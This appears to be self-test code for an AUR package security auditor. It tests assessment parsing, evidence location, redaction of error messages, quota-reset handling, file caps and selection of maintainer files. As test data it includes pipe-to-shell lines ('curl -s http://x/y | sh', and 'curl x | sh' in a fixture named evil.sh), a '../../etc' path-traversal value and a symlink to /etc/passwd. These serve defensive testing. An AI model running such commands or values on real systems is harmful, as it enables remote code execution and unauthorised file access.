def selftest_evidence():
    """Offline checks for the evidence quote: parsing, cleaning, line lookup."""

    # Strict XML path, with the escaping the prompt asks for.
    parsed = parse_security_assessment(
        "<security_assessment><decision>UNSAFE</decision>"
        "<details>bad</details>"
        "<evidence>curl -s http://x/y | sh &amp;&amp; echo &lt;done&gt;</evidence>"
        "<summary>s</summary></security_assessment>"
    )
    assert parsed == ("UNSAFE", "bad", "s", "curl -s http://x/y | sh && echo <done>"), parsed

    # Regex fallback (the raw '<' breaks strict XML) still yields the quote.
    parsed = parse_security_assessment(
        "<security_assessment><decision>UNSAFE</decision>"
        "<details>a < b</details><evidence>x=1\ny=2</evidence>"
        "<summary>s</summary></security_assessment>"
    )
    assert parsed[3] == "x=1\ny=2", parsed

    # No tag at all: None, not a crash. Old-format responses keep working.
    parsed = parse_security_assessment(
        "<security_assessment><decision>SAFE</decision>"
        "<details>fine</details><summary>s</summary></security_assessment>"
    )
    assert parsed == ("SAFE", "fine", "s", None), parsed

    # Cleaning: fences and blank edges go, the size cap holds.
    assert clean_evidence(None) == ""
    assert clean_evidence("```bash\n\n  eval $x  \n\n```") == "  eval $x"
    many = "\n".join(f"line{i}" for i in range(40))
    assert clean_evidence(many).count("\n") == EVIDENCE_MAX_LINES - 1
    assert len(clean_evidence("x" * 5000)) == EVIDENCE_MAX_CHARS

    # Locating: a re-indented block, a block spanning a blank line, a lone
    # unique line, an ambiguous lone line, and a paraphrase.
    content = "a\n\nb\n    c\nd\n\n  e\nd\n"
    assert locate_evidence("b\nc", content) == 3
    assert locate_evidence("  c\n  d", content) == 4
    assert locate_evidence("d\ne", content) == 5
    assert locate_evidence("e", content) == 7
    assert locate_evidence("d\nzzz", content) is None  # 'd' is not unique
    assert locate_evidence("nope", content) is None
    assert locate_evidence("", content) is None


def selftest_error_description():
    """An API error's body never reaches a report line, a failed command
    contributes its program and status but not its arguments, and this
    program's own errors pass through."""
    # openai 3 depends on httpx2, the renamed successor of httpx; openai 1
    # on httpx. The script pins neither, so the name depends on when the
    # environment was resolved. The selftest only builds fake responses.
    try:
        import httpx
    except ImportError:
        import httpx2 as httpx
    from openai import RateLimitError

    body = {"error": {"message": "free-models-per-day exceeded for user_secret", "code": 429}}
    resp = httpx.Response(
        429, json=body, request=httpx.Request("POST", "https://llm.internal/v1")
    )
    e = RateLimitError(f"Error code: 429 - {body}", response=resp, body=body)
    assert "user_secret" in str(e)  # the raw form is the hazard
    msg = describe_error(e)
    assert "429" in msg, msg
    assert "user_secret" not in msg and "llm.internal" not in msg, msg

    e = subprocess.CalledProcessError(1, ["/usr/bin/makepkg", "--nobuild", "/data/bulk/pkg"])
    assert describe_error(e) == "makepkg exited with status 1", describe_error(e)
    e = subprocess.CalledProcessError(2, "git clone https://aur.archlinux.org/x.git /data/x")
    assert describe_error(e) == "git exited with status 2", describe_error(e)

    assert describe_error(RuntimeError("no assessment tag")) == "RuntimeError: no assessment tag"

    e = FileNotFoundError(2, "No such file or directory", "/home/someone/pkg/x.install")
    assert describe_error(e) == "FileNotFoundError: No such file or directory", describe_error(e)


def selftest_pkgbase():
    """A split package resolves to its base; everything else -- the same
    name, no result, a malformed reply, a base that is not a name -- is the
    name itself."""
    reply = {"resultcount": 1, "type": "multiinfo", "version": 5,
             "results": [{"Name": "immich-server", "PackageBase": "immich"}]}
    assert pkgbase_from_rpc(reply, "immich-server") == "immich"
    assert pkgbase_from_rpc(reply, "immich") == "immich"
    assert pkgbase_from_rpc({"resultcount": 0, "results": []}, "gone") == "gone"
    assert pkgbase_from_rpc({"error": "Incorrect request type specified."}, "x") == "x"
    assert pkgbase_from_rpc("not json", "x") == "x"
    assert pkgbase_from_rpc({"results": ["x", None]}, "x") == "x"
    evil = {"results": [{"Name": "x", "PackageBase": "../../etc"}]}
    assert pkgbase_from_rpc(evil, "x") == "x"
    assert pkgbase_from_rpc({"results": [{"Name": "x", "PackageBase": 7}]}, "x") == "x"


def selftest_quota_reset():
    """A per-day 429 yields its reset epoch, in seconds; a per-minute one,
    or any other error, yields nothing; a per-day one that does not say
    when means the next 00:00 UTC. The note lands where the pipeline asked."""
    # openai 3 depends on httpx2, the renamed successor of httpx; openai 1
    # on httpx. The script pins neither, so the name depends on when the
    # environment was resolved. The selftest only builds fake responses.
    try:
        import httpx
    except ImportError:
        import httpx2 as httpx
    from openai import AuthenticationError, RateLimitError

    def err(message, headers=None, status=429):
        body = {"error": {"message": message, "code": status}}
        if headers is not None:
            body["error"]["metadata"] = {"headers": headers}
        resp = httpx.Response(
            status, json=body, request=httpx.Request("POST", "https://llm.internal/v1")
        )
        cls = RateLimitError if status == 429 else AuthenticationError
        return cls(f"Error code: {status} - {body}", response=resp, body=body)

    future_ms = (int(time.time()) + 3600) * 1000
    got = quota_reset_from_error(err(
        "Rate limit exceeded: free-models-per-day-high-balance. ",
        {"X-RateLimit-Limit": "1000", "X-RateLimit-Remaining": "0",
         "X-RateLimit-Reset": str(future_ms)},
    ))
    assert got == future_ms // 1000, got
    assert quota_reset_from_error(err(
        "Rate limit exceeded: free-models-per-min. ", {"X-RateLimit-Reset": str(future_ms)}
    )) is None
    assert quota_reset_from_error(err("bad key", status=401)) is None
    assert quota_reset_from_error(RuntimeError("per-day")) is None
    now = int(time.time())
    got = quota_reset_from_error(err("free-models-per-day exceeded"))
    assert now < got <= now + 86400 and got % 86400 == 0, got

    # The shape line: what a 429 that did NOT match carried, so a run in
    # production can say why. Every field quota_reset_from_error reads, and
    # nothing else; a long message is cut rather than logged whole.
    shape = rate_limit_shape(err("Rate limit exceeded: free-models-per-min. ",
                                 {"X-RateLimit-Reset": "1787616000000"}))
    assert "free-models-per-min" in shape, shape
    assert "body-reset='1787616000000'" in shape, shape
    assert "response-reset=" in shape, shape
    assert rate_limit_shape(err("x" * 500)).count("x") == 300, "the message is cut"
    assert "message=''" in rate_limit_shape(RuntimeError("no body here")), "any error is safe"

    with tempfile.TemporaryDirectory() as d:
        path = os.path.join(d, "reset")
        old = os.environ.get("AUR_SLEUTH_QUOTA_RESET_FILE")
        os.environ["AUR_SLEUTH_QUOTA_RESET_FILE"] = path
        try:
            note_quota_reset(1787616000)
        finally:
            if old is None:
                os.environ.pop("AUR_SLEUTH_QUOTA_RESET_FILE", None)
            else:
                os.environ["AUR_SLEUTH_QUOTA_RESET_FILE"] = old
        with open(path, encoding="utf-8") as f:
            assert f.read() == "1787616000\n"


def selftest_file_caps():
    """The two caps that keep a file review in memory and under the request
    limit: a byte cap by stat, and a character cap after the line cap."""
    marker = "characters omitted"
    # Small stays whole; many short lines are cut by lines and stay under the
    # character cap; one enormous line is cut by characters.
    assert _smart_truncate_for_audit("x\n" * 10) == "x\n" * 10
    many = "line\n" * 5000
    cut = _smart_truncate_for_audit(many)
    assert cut.count("\n") < 5000 and marker not in cut and len(cut) <= MAX_FILE_CHARS
    one = "a" * 300_000
    cut = _smart_truncate_for_audit(one)
    assert marker in cut and len(cut) < MAX_FILE_CHARS + 200, len(cut)
    assert cut.startswith("a" * 100) and cut.endswith("a" * 100)
    # Both at once: 5000 lines of 200 chars is 1 MB; the line cap leaves ~1500
    # lines (~300k chars) and the character cap takes it the rest of the way.
    # The line cap's own marker sits in the middle it cuts away; what
    # survives is the head, the tail, and the character marker between.
    both = _smart_truncate_for_audit(("b" * 199 + "\n") * 5000)
    assert marker in both and len(both) < MAX_FILE_CHARS + 200, len(both)
    assert both.startswith("b" * 199 + "\n") and both.endswith("b" * 199 + "\n")
    # The byte cap never reads the file: a sparse file is all size and no bytes.
    with tempfile.TemporaryDirectory() as d:
        small = Path(d) / "small.sh"
        small.write_text("#!/bin/sh\n")
        assert file_exceeds_size_cap(small) is None
        huge = Path(d) / "installer.run"
        with open(huge, "wb") as f:
            f.truncate(MAX_FILE_BYTES + 1)
        assert file_exceeds_size_cap(huge) == MAX_FILE_BYTES + 1
        assert file_exceeds_size_cap(Path(d) / "absent") is None
    print("✓ selftest_file_caps")


def selftest_maintainer_files():
    """The review set is what was in the package directory before makepkg
    ran, and nothing it fetched. In a git checkout that is `git ls-files`;
    elsewhere it is the directory minus src/ and pkg/."""
    import tempfile
    with tempfile.TemporaryDirectory() as d:
        pkg = Path(d)
        (pkg / "PKGBUILD").write_text("pkgname=x\n", encoding="utf-8")
        (pkg / "x.install").write_text("post_install() { :; }\n", encoding="utf-8")
        (pkg / "tools").mkdir()
        (pkg / "tools" / "gen.py").write_text("print()\n", encoding="utf-8")
        # What makepkg leaves behind, and a link out of the directory.
        (pkg / "src" / "x-1.0").mkdir(parents=True)
        (pkg / "src" / "x-1.0" / "Makefile").write_text("all:\n", encoding="utf-8")
        (pkg / "pkg").mkdir()
        (pkg / "pkg" / "stray").write_text("", encoding="utf-8")
        (pkg / "passwd").symlink_to("/etc/passwd")
        got = maintainer_files(pkg)
        assert got == [Path("PKGBUILD"), Path("tools/gen.py"), Path("x.install")], got

        # As a git repository: the committed files, and nothing untracked --
        # so a leftover from an earlier run in the root is not the
        # maintainer's either.
        subprocess.run(["git", "init", "-q", str(pkg)], check=True)
        subprocess.run(["git", "-C", str(pkg), "add", "PKGBUILD", "x.install", "tools"], check=True)
        (pkg / "leftover.tar.gz").write_text("", encoding="utf-8")
        got = maintainer_files(pkg)
        assert got == [Path("PKGBUILD"), Path("tools/gen.py"), Path("x.install")], got

        # A subdirectory of some other repository (a synthetic fixture inside
        # this one) is walked, not listed: the fixture is not its own repo.
        sub = pkg / "fixture"
        sub.mkdir()
        (sub / "PKGBUILD").write_text("pkgname=y\n", encoding="utf-8")
        (sub / "evil.sh").write_text("curl x | sh\n", encoding="utf-8")
        assert maintainer_files(sub) == [Path("PKGBUILD"), Path("evil.sh")]
    print("✓ selftest_maintainer_files")


